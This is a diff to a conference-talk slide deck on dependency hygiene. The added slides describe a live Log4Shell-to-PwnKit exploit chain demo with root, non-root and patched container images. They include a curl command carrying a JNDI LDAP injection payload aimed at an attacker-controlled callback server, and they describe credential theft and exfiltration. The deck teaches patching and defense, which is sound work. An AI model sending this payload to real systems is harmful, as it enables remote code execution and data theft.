@@ -127,7 +127,7 @@
         <p class="subtitle">Three live demos, coming up</p>
         <ul class="icon-list medium" style="max-width:480px;margin:0.8em auto 0;">
             <li><span class="ic">🚀</span><span>Performance benefit</span></li>
-            <li><span class="ic">🦠</span><span>Vulnerable application</span></li>
+            <li><span class="ic">🦠</span><span>Vulnerable application: live exploit chain</span></li>
             <li><span class="ic">🔎</span><span>Known vulnerabilities</span></li>
         </ul>
     </section>
@@ -161,9 +161,40 @@
     </section>
 
     <section>
-        <h2>Vulnerable application</h2>
+        <h2>🎯 Live Demo: Log4Shell → RCE → PwnKit</h2>
+        <p class="subtitle">One curl command, real network hops, on the projector</p>
+        <div class="medium">
+            <ul class="icon-list" style="margin-top:0.6em;">
+                <li><span class="ic">🎯</span><span>A search box on a Java 17 / Spring Boot 2.7 app running <code>log4j-core 2.14.1</code> (pre-patch)</span></li>
+                <li><span class="ic">📡</span><span>One query string triggers a JNDI lookup against an "attacker" LDAP server</span></li>
+                <li><span class="ic">💀</span><span>The attacker's class loads on the victim: recon, credential/env-var theft, exfiltration</span></li>
+                <li><span class="ic">🔓</span><span>If the victim isn't already root, it then tries <strong>CVE-2021-4034 (PwnKit)</strong> to escalate</span></li>
+            </ul>
+        </div>
+        <div class="box box-red medium" style="margin-top:0.6em;">
+            <pre><code class="language-bash">curl "http://victim:8080/api/products/search?q=\${jndi:ldap://callback:1389/pwnkit}"</code></pre>
+            <p class="small" style="margin:0.3em 0 0;">Everything the exploit steals gets logged live on the attacker's own dashboard: <code>http://localhost:9999/dashboard/live</code>, built to be watched on a projector.</p>
+        </div>
+    </section>
+
+    <section>
+        <h2>Same JAR, Three Images, Three Outcomes</h2>
+        <p class="subtitle">The Dockerfile decides how far the attack gets</p>
+        <table class="small" style="margin-top:0.5em;">
+            <thead><tr><th>Image</th><th>User</th><th>Base</th><th>Result</th></tr></thead>
+            <tbody>
+                <tr><td><code>vuln-app:root</code></td><td>root</td><td>temurin:11-jre-jammy + gcc/curl/sudo/policykit</td><td class="tag-bad">❌ RCE = game over, already root</td></tr>
+                <tr><td><code>vuln-app:escalation</code></td><td>appuser (1000)</td><td>temurin:11-jre-jammy + gcc/policykit</td><td class="tag-warn">⚠️ RCE, then attempts PwnKit to reach root</td></tr>
+                <tr><td><code>vuln-app:safe</code></td><td>ubuntu (1000)</td><td>temurin:25-jre, no extra packages</td><td class="tag-good">✅ Patched Log4j blocks the JNDI lookup outright</td></tr>
+            </tbody>
+        </table>
+        <p class="small" style="margin-top:0.5em;">Same code, same curl request: the Java version and OS packages decide whether this is a non-event or a total compromise.</p>
+    </section>
+
+    <section>
+        <h2>🔍 Full Attack Transcript</h2>
         <div class="iframe-wrap">
-            <iframe src="https://johanjanssen.github.io/Keep-Up-To-Date/vulnerable/" loading="lazy" title="Vulnerable application"></iframe>
+            <iframe src="https://johanjanssen.github.io/Keep-Up-To-Date/vulnerable/" loading="lazy" title="Log4Shell to PwnKit exploit chain transcript"></iframe>
         </div>
         <p class="small" style="margin-top:0.4em;">
             <a class="go-btn" href="https://johanjanssen.github.io/Keep-Up-To-Date/vulnerable/" target="_blank">↗ Open in new tab</a>
@@ -316,7 +347,7 @@ osv-scanner scan --sbom=target/bom.json .</code></pre>
         <div class="box box-red medium" style="margin-top:0.5em;">
             <strong>The bill:</strong> billions of dollars in remediation, lost productivity, and follow-on attacks; fixing it consumed up to <strong>12%</strong> of some organizations' entire annual IT, application-development, and security budgets, all for one transitive dependency.
         </div>
-        <p class="small" style="margin-top:0.5em;color:#657b83;">Root cause: not a bug anyone wrote; a library nobody had reviewed in years, several layers down in the dependency tree.</p>
+        <p class="small" style="margin-top:0.5em;color:#657b83;">Root cause: not a bug anyone wrote; a library nobody had reviewed in years, several layers down in the dependency tree. This is the exact CVE you just watched fire live.</p>
     </section>
 
     <section>
